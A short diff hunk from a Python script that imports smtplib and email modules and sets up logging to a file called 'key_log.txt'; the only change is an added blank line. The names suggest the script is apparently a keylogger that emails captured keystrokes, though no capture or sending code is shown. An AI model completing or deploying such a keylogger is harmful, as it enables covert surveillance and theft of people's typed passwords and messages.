@@ -4,6 +4,7 @@ import smtplib
 from email.mime.text import MIMEText
 import threading
 
+
 log_dir = ""
 logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format="%(asctime)s - %(message)s")
 
